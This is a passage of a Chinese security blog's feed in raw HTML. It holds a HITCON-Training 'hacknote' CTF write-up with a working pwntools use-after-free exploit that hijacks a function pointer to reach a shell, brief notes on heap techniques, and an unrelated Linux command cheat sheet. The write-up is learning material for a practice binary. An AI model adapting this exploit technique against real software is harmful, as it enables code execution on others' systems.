class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//先free掉content</span>    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//再free自己</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>print_note:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>还可以看到一个<code>magic（addr = 0x08048986)</code>函数，而这个函数就是我们的目标哦：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102205533.png" alt=""></p><blockquote><p> 解题逻辑：通过上面对fastbin，uaf的了解后，大概可以理解这个题目的解题方法了。我们首先要明白malloc和free机制，先被free掉的块会很快被应用于新的malloc，前提是大小合适，例如<code>free v1; v2 = malloc(4)</code>，如果原来v1的大小也为4，那么v1原来的那块内存就会被分配给v2，通过v1可以（uaf）访问v2的内容。</p><p>F，A，U（先FREE,再修改chunk，调用chunk中的函数指针）。让两个指针实际指向同一个chunk，一个指针把内存解释为字符串，从而写入任意值，另一个指针把内存解释为函数指针，从而控制了EIP。</p></blockquote><h3 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h3><p>借鉴veritas501师傅的EXP，稍加修改和理解：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>bin <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#添加</span><span class="token keyword">def</span> <span class="token function">add_note</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#删除——free</span><span class="token keyword">def</span> <span class="token function">del_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#打印</span><span class="token keyword">def</span> <span class="token function">print_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#size随意，不等于8就行</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#content的大小不等于8（这是程序中note_chunk的大小,note_chunk就是第一次malloc的那个），是为了等会分配8 bytes的content不会被分配到之前的content的bin上，而是分配到note的bin上。</span><span class="token comment" spellcheck="true">#按照malloc和free机制，如果我们del_note换一下位置，先del_note(1)，note2_chunk会被放在原来的note0_chunk位置，而note3_content里的magic函数地址就会被放在note1_chunk位置，后面的print_note(0)，同样也需要改为print_note(1)，才能getshell</span>del_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>bin<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'magic'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>print_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102214243.png" alt=""></p><h2 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11-bamboobox"></a>lab11-bamboobox</h2><h3 id="hof-house-of-force"><a href="#hof-house-of-force" class="headerlink" title="hof (house of force)"></a>hof (house of force)</h3><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html" target="_blank" rel="noopener">heap-exploitation——house of force参考链接</a></p><blockquote><p>引用m4x大佬博客原话：</p><p>简单说一下我对 hof 的理解，如果我们能控制 <strong>top_chunk</strong> 的 <strong>size</strong>，那么我们就可以通过控制 malloc 一些精心设计的<strong>大数/负数</strong>来实现控制 top_chunk 的指针，就可以实现任意地址写的效果，个人感觉，hof 的核心思想就在这个 force 上，疯狂 malloc，简单粗暴效果明显。</p></blockquote><h3 id="off-by-one漏洞"><a href="#off-by-one漏洞" class="headerlink" title="off_by_one漏洞"></a>off_by_one漏洞</h3><blockquote><p><a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">参考链接</a></p><p>一个字节溢出被称为off-by-one，曾经的一段时间里，off-by-one被认为是不可以利用的，但是后来研究发现在堆上哪怕只有一个字节的溢出也会导致任意代码的执行。</p></blockquote><blockquote><p>==&gt; off-by-one总共可以分为两种利用方式:</p><p><strong>chunk overlapping</strong></p><ul><li><p>off-by-one overwrite allocated</p></li><li><p>off-by-one overwrite freed</p></li><li><p>off-by-one null byte</p></li></ul><p><strong>unlink</strong></p><ul><li><p>off-by-one small bin</p></li><li><p>off-by-one large bin</p></li></ul></blockquote><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">unlink——pdf</a></p><h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p>checksec it!</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102221726.png" alt=""></p><p>开启了NX,Stack，同样无法通过常规方式来攻击。</p></blockquote><p>待更新。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-11月02-Hitcon-六&quot;&gt;&lt;a href=&quot;#Pwn-11月02-Hitcon-六&quot; class=&quot;headerlink&quot; title=&quot;Pwn-11月02-Hitcon-六&quot;&gt;&lt;/a&gt;Pwn-11月02-Hitcon-六&lt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>/dev/null和常用linux命令集</title>
    <link href="http://www.yof3ng.xyz/2018/11/01/devnull%E5%92%8C%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4%E9%9B%86/"/>
    <id>http://www.yof3ng.xyz/2018/11/01/devnull和常用linux命令集/</id>
    <published>2018-11-01T15:16:26.000Z</published>
    <updated>2018-11-01T15:27:37.391Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h1><blockquote><p>😭因为忘了参考了哪些文章，所以如若有侵权之处，还请联系博主。</p></blockquote><h2 id="dev-null-与-重定向"><a href="#dev-null-与-重定向" class="headerlink" title="/dev/null 与 重定向"></a>/dev/null 与 重定向</h2><p>==&gt; /dev/null 是linux系统中的一个特殊文件设备，他的作用是接受一切输入它的数据并丢弃这些数据,通常被当做垃圾桶来用。将输出流重定向到/dev/null上面，就是丢弃这个输出流上的所有输出，/dev/null也叫linux中的黑洞。</p><p><strong>0:表示键盘输入(stdin)</strong></p><p><strong>1:表示标准输出(stdout),</strong>系统默认是1 </p><p><strong>2:表示错误输出(stderr)</strong> </p><pre class=" language-bash"><code class="language-bash"><span class="token string">"command >/dev/null 2>&amp;1 &amp;"</span>  与 <span class="token string">"command 1>/dev/null 2>&amp;1 &amp;"</span>  的意思一样1<span class="token punctuation">)</span> command:   表示shell命令或者为一个可执行程序2<span class="token punctuation">)</span> <span class="token operator">></span>:  表示重定向到哪里 3<span class="token punctuation">)</span> /dev/null:  表示Linux的空设备文件 4<span class="token punctuation">)</span> 2:  表示标准错误输出5<span class="token punctuation">)</span> <span class="token operator">&amp;</span>1:  <span class="token operator">&amp;</span>表示等同于的意思,  2<span class="token operator">></span><span class="token operator">&amp;</span>1表示2的输出重定向于16<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token keyword">:</span>  **表示后台执行,即这条指令执行在后台运行** </code></pre><p>==&gt; 比如 find -user root   2&gt;/dev/null  &gt;1.txt &amp;，就是将文件用户属性为root的文文件名及其路径重定向到文件1.txt中</p><p><strong>==&gt; 但是</strong> find -user root   1&gt;/dev/null 却是与上一条命令不同的，用的是标准输出流，不会显示在屏幕上，只能输出到文件中；如果加点东西上去变成 find -user root   1&gt;/dev/null 1&gt;&amp;2 那么标准输出流被重定向到标准错误输出流，就会在屏幕上显示查找到的信息了。</p><p>==&gt; 再比如 grep -Ri woshiflag.py 2&gt;/dev/null 1&gt;&amp;2 ,就是将与woshiflag.py脚本有关的文件列出，并且将标准输出流重定向到标准错误输出流,显示到屏幕上。</p><hr><pre class=" language-bash"><code class="language-bash">- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span>file- <span class="token function">command</span> <span class="token operator">></span> <span class="token function">file</span> 2<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre><p><strong>不同点: I/O效率上的差异</strong> </p><p> ==&gt; command 1&gt;file 2&gt;file 这样的写法,stdout和stderr都直接送到file中, file会被打开两次,这样stdout和stderr会互相覆盖,这样写相当使用了FD1和FD2两个同时去抢占file的管道。 </p><p>==&gt; command 1&gt;file 2&gt;&amp;1 这条命令就将stdout直接送向file, stderr 继承了FD1管道后,再被送往file,此时,file只被打开了一次,也只使用了一个管道FD1,它包括了stdout和stderr的内容。</p><p>==&gt; 从I/O 效率上,前一条命令的效率要比后面一条的命令效率要低,所以在编写shell脚本的时候,最多的时候我们会command 1&gt;file 2&gt;&amp;1 这样的写法， 或 “command &gt;file 2&amp;1” </p><h1 id="linux-常用命令集"><a href="#linux-常用命令集" class="headerlink" title="linux 常用命令集"></a>linux 常用命令集</h1><h2 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h2><pre class=" language-bash"><code class="language-bash">arch 显示机器的处理器架构<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">uname</span> -m 显示机器的处理器架构<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">uname</span> -r 显示正在使用的内核版本 dmidecode -q 显示硬件系统部件 - <span class="token punctuation">(</span>SMBIOS / DMI<span class="token punctuation">)</span> hdparm -i /dev/hda 罗列一个磁盘的架构特性 hdparm -tT /dev/sda 在磁盘上执行测试性读取操作 <span class="token function">cat</span> /proc/cpuinfo 显示CPU info的信息 <span class="token function">cat</span> /proc/interrupts 显示中断 <span class="token function">cat</span> /proc/meminfo 校验内存使用 <span class="token function">cat</span> /proc/swaps 显示哪些swap被使用 <span class="token function">cat</span> /proc/version 显示内核的版本 <span class="token function">cat</span> /proc/net/dev 显示网络适配器及统计 <span class="token function">cat</span> /proc/mounts 显示已加载的文件系统 lspci -tv 罗列 PCI 设备 lsusb -tv 显示 USB 设备 <span class="token function">date</span> 显示系统日期 <span class="token function">cal</span> 2007 显示2007年的日历表 <span class="token function">date</span> 041217002007.00 设置日期和时间 - 月日时分年.秒 clock -w 将时间修改保存到 BIOS关机 <span class="token punctuation">(</span>系统的关机、重启以及登出 <span class="token punctuation">)</span> <span class="token function">shutdown</span> -h now 关闭系统<span class="token punctuation">(</span>1<span class="token punctuation">)</span> init 0 关闭系统<span class="token punctuation">(</span>2<span class="token punctuation">)</span> telinit 0 关闭系统<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token function">shutdown</span> -h hours:minutes <span class="token operator">&amp;</span> 按预定时间关闭系统 <span class="token function">shutdown</span> -c 取消按预定时间关闭系统 <span class="token function">shutdown</span> -r now 重启<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">reboot</span> 重启<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">logout</span> 注销</code></pre><h2 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /home 进入 <span class="token string">'/ home'</span> 目录<span class="token string">' cd .. 返回上一级目录 cd ../.. 返回上两级目录 cd 进入个人的主目录 cd ~user1 进入个人的主目录 cd - 返回上次所在的目录 pwd 显示工作路径 ls 查看目录中的文件 ls -F 查看目录中的文件 ls -l 显示文件和目录的详细资料 ls -a 显示隐藏文件 ls *[0-9]* 显示包含数字的文件名和目录名 tree 显示文件和目录由根目录开始的树形结构(1) lstree 显示文件和目录由根目录开始的树形结构(2) mkdir dir1 创建一个叫做 '</span>dir1<span class="token string">' 的目录'</span> <span class="token function">mkdir</span> dir1 dir2 同时创建两个目录 <span class="token function">mkdir</span> -p /tmp/dir1/dir2 创建一个目录树 <span class="token function">rm</span> -f file1 删除一个叫做 <span class="token string">'file1'</span> 的文件<span class="token string">' rmdir dir1 删除一个叫做 '</span>dir1<span class="token string">' 的目录'</span> <span class="token function">rm</span> -rf dir1 删除一个叫做 <span class="token string">'dir1'</span> 的目录并同时删除其内容 <span class="token function">rm</span> -rf dir1 dir2 同时删除两个目录及它们的内容 <span class="token function">mv</span> dir1 new_dir 重命名/移动 一个目录 <span class="token function">cp</span> file1 file2 复制一个文件 <span class="token function">cp</span> dir/* <span class="token keyword">.</span> 复制一个目录下的所有文件到当前工作目录 <span class="token function">cp</span> -a /tmp/dir1 <span class="token keyword">.</span> 复制一个目录到当前工作目录 <span class="token function">cp</span> -a dir1 dir2 复制一个目录 <span class="token function">ln</span> -s file1 lnk1 创建一个指向文件或目录的软链接 <span class="token function">ln</span> file1 lnk1 创建一个指向文件或目录的物理链接 <span class="token function">touch</span> -t 0712250000 file1 修改一个文件或目录的时间戳 - <span class="token punctuation">(</span>YYMMDDhhmm<span class="token punctuation">)</span> <span class="token function">file</span> file1 outputs the mime <span class="token function">type</span> of the <span class="token function">file</span> as text <span class="token function">iconv</span> -l 列出已知的编码 <span class="token function">iconv</span> -f fromEncoding -t toEncoding inputFile <span class="token operator">></span> outputFile creates a new from the given input <span class="token function">file</span> by assuming it is encoded <span class="token keyword">in</span> fromEncoding and converting it to toEncoding. <span class="token function">find</span> <span class="token keyword">.</span> -maxdepth 1 -name *.jpg -print -exec convert <span class="token string">"{}"</span> -resize 80x60 <span class="token string">"thumbs/{}"</span> \<span class="token punctuation">;</span> batch resize files <span class="token keyword">in</span> the current directory and send them to a thumbnails directory <span class="token punctuation">(</span>requires convert from Imagemagick<span class="token punctuation">)</span></code></pre><h2 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -name file1 从 <span class="token string">'/'</span> 开始进入根文件系统搜索文件和目录 <span class="token function">find</span> / -user user1 搜索属于用户 <span class="token string">'user1'</span> 的文件和目录 <span class="token function">find</span> /home/user1 -name \*.bin 在目录 <span class="token string">'/ home/user1'</span> 中搜索带有<span class="token string">'.bin'</span> 结尾的文件 <span class="token function">find</span> /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件 <span class="token function">find</span> /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件 <span class="token function">find</span> / -name \*.rpm -exec <span class="token function">chmod</span> 755 <span class="token string">'{}'</span> \<span class="token punctuation">;</span> 搜索以 <span class="token string">'.rpm'</span> 结尾的文件并定义其权限 <span class="token function">find</span> / -xdev -name \*.rpm 搜索以 <span class="token string">'.rpm'</span> 结尾的文件，忽略光驱、捷盘等可移动设备 <span class="token function">locate</span> \*.ps 寻找以 <span class="token string">'.ps'</span> 结尾的文件 - 先运行 <span class="token string">'updatedb'</span> 命令 <span class="token function">whereis</span> halt 显示一个二进制文件、源码或man的位置 <span class="token function">which</span> halt 显示一个二进制文件或可执行文件的完整路径</code></pre><h2 id="挂载一个文件系统"><a href="#挂载一个文件系统" class="headerlink" title="挂载一个文件系统"></a>挂载一个文件系统</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">mount</span> /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 <span class="token string">'/ mnt/hda2'</span> 已经存在 <span class="token function">umount</span> /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 <span class="token string">'/ mnt/hda2'</span> 退出 <span class="token function">fuser</span> -km /mnt/hda2 当设备繁忙时强制卸载 <span class="token function">umount</span> -n /mnt/hda2 运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用 <span class="token function">mount</span> /dev/fd0 /mnt/floppy 挂载一个软盘 <span class="token function">mount</span> /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom <span class="token function">mount</span> /dev/hdc /mnt/cdrecorder 挂载一个cdrw或dvdrom <span class="token function">mount</span> /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom <span class="token function">mount</span> -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件 <span class="token function">mount</span> -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统 <span class="token function">mount</span> /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备 <span class="token function">mount</span> -t smbfs -o username<span class="token operator">=</span>user,password<span class="token operator">=</span>pass //WinClient/share /mnt/share 挂载一个windows网络共享</code></pre><h2 id="磁盘空间"><a href="#磁盘空间" class="headerlink" title="磁盘空间"></a>磁盘空间</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">df</span> -h 显示已经挂载的分区列表 <span class="token function">ls</span> -lSr <span class="token operator">|</span><span class="token function">more</span> 以尺寸大小排列文件和目录 <span class="token function">du</span> -sh dir1 估算目录 <span class="token string">'dir1'</span> 已经使用的磁盘空间<span class="token string">' du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小 rpm -q -a --qf '</span>%10<span class="token punctuation">{</span>SIZE<span class="token punctuation">}</span>t%<span class="token punctuation">{</span>NAME<span class="token punctuation">}</span>n<span class="token string">' | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统) dpkg-query -W -f='</span>Installed−Size<span class="token punctuation">;</span>10tInstalled−Size<span class="token punctuation">;</span>10t<span class="token punctuation">{</span>Package<span class="token punctuation">}</span>n' <span class="token operator">|</span> <span class="token function">sort</span> -k1,1n 以大小为依据显示已安装的deb包所使用的空间 <span class="token punctuation">(</span>ubuntu, debian类系统<span class="token punctuation">)</span></code></pre><h2 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">groupadd</span> group_name 创建一个新用户组 <span class="token function">groupdel</span> group_name 删除一个用户组 <span class="token function">groupmod</span> -n new_group_name old_group_name 重命名一个用户组 <span class="token function">useradd</span> -c <span class="token string">"Name Surname "</span> -g admin -d /home/user1 -s /bin/bash user1 创建一个属于 <span class="token string">"admin"</span> 用户组的用户 <span class="token function">useradd</span> user1 创建一个新用户 <span class="token function">userdel</span> -r user1 删除一个用户 <span class="token punctuation">(</span> <span class="token string">'-r'</span> 排除主目录<span class="token punctuation">)</span> <span class="token function">usermod</span> -c <span class="token string">"User FTP"</span> -g system -d /ftp/user1 -s /bin/nologin user1 修改用户属性 <span class="token function">passwd</span> 修改口令 <span class="token function">passwd</span> user1 修改一个用户的口令 <span class="token punctuation">(</span>只允许root执行<span class="token punctuation">)</span> chage -E 2005-12-31 user1 设置用户口令的失效期限 pwck 检查 <span class="token string">'/etc/passwd'</span> 的文件格式和语法修正以及存在的用户 grpck 检查 <span class="token string">'/etc/passwd'</span> 的文件格式和语法修正以及存在的群组 newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组</code></pre><h2 id="文件的权限"><a href="#文件的权限" class="headerlink" title="文件的权限"></a>文件的权限</h2><pre class=" language-bash"><code class="language-bash">-——使用 <span class="token string">"+"</span> 设置权限，使用 <span class="token string">"-"</span> 用于取消 <span class="token function">ls</span> -lh 显示权限 <span class="token function">ls</span> /tmp <span class="token operator">|</span> <span class="token function">pr</span> -T5 -W<span class="token variable">$COLUMNS</span> 将终端划分成5栏显示 <span class="token function">chmod</span> ugo+rwx directory1 设置目录的所有人<span class="token punctuation">(</span>u<span class="token punctuation">)</span>、群组<span class="token punctuation">(</span>g<span class="token punctuation">)</span>以及其他人<span class="token punctuation">(</span>o<span class="token punctuation">)</span>以读（r ）、写<span class="token punctuation">(</span>w<span class="token punctuation">)</span>和执行<span class="token punctuation">(</span>x<span class="token punctuation">)</span>的权限 <span class="token function">chmod</span> go-rwx directory1 删除群组<span class="token punctuation">(</span>g<span class="token punctuation">)</span>与其他人<span class="token punctuation">(</span>o<span class="token punctuation">)</span>对目录的读写执行权限 <span class="token function">chown</span> user1 file1 改变一个文件的所有人属性 <span class="token function">chown</span> -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性 <span class="token function">chgrp</span> group1 file1 改变文件的群组 <span class="token function">chown</span> user1:group1 file1 改变一个文件的所有人和群组属性 <span class="token function">find</span> / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件 <span class="token function">chmod</span> u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限 <span class="token function">chmod</span> u-s /bin/file1 禁用一个二进制文件的 SUID位 <span class="token function">chmod</span> g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的 <span class="token function">chmod</span> g-s /home/public 禁用一个目录的 SGID 位 <span class="token function">chmod</span> o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件 <span class="token function">chmod</span> o-t /home/public 禁用一个目录的 STIKY 位</code></pre><h2 id="文件的特殊属性"><a href="#文件的特殊属性" class="headerlink" title="文件的特殊属性"></a>文件的特殊属性</h2><pre class=" language-bash"><code class="language-bash">—— 使用 <span class="token string">"+"</span> 设置权限，使用 <span class="token string">"-"</span> 用于取消 chattr +a file1 只允许以追加方式读写文件 chattr +c file1 允许这个文件能被内核自动压缩/解压 chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件 chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接 chattr +s file1 允许一个文件被安全地删除 chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘 chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件 lsattr 显示特殊的属性</code></pre><h2 id="打包和压缩文件"><a href="#打包和压缩文件" class="headerlink" title="打包和压缩文件"></a>打包和压缩文件</h2><pre class=" language-bash"><code class="language-bash">bunzip2 file1.bz2 解压一个叫做 <span class="token string">'file1.bz2'</span>的文件 <span class="token function">bzip2</span> file1 压缩一个叫做 <span class="token string">'file1'</span> 的文件 gunzip file1.gz 解压一个叫做 <span class="token string">'file1.gz'</span>的文件 <span class="token function">gzip</span> file1 压缩一个叫做 <span class="token string">'file1'</span>的文件 <span class="token function">gzip</span> -9 file1 最大程度压缩 <span class="token function">rar</span> a file1.rar test_file 创建一个叫做 <span class="token string">'file1.rar'</span> 的包 <span class="token function">rar</span> a file1.rar file1 file2 dir1 同时压缩 <span class="token string">'file1'</span>, <span class="token string">'file2'</span> 以及目录 <span class="token string">'dir1'</span> <span class="token function">rar</span> x file1.rar 解压rar包 <span class="token function">unrar</span> x file1.rar 解压rar包 <span class="token function">tar</span> -cvf archive.tar file1 创建一个非压缩的 tarball <span class="token function">tar</span> -cvf archive.tar file1 file2 dir1 创建一个包含了 <span class="token string">'file1'</span>, <span class="token string">'file2'</span> 以及 <span class="token string">'dir1'</span>的档案文件 <span class="token function">tar</span> -tf archive.tar 显示一个包中的内容 <span class="token function">tar</span> -xvf archive.tar 释放一个包 <span class="token function">tar</span> -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下 <span class="token function">tar</span> -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包 <span class="token function">tar</span> -xvfj archive.tar.bz2 解压一个bzip2格式的压缩包 <span class="token function">tar</span> -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包 <span class="token 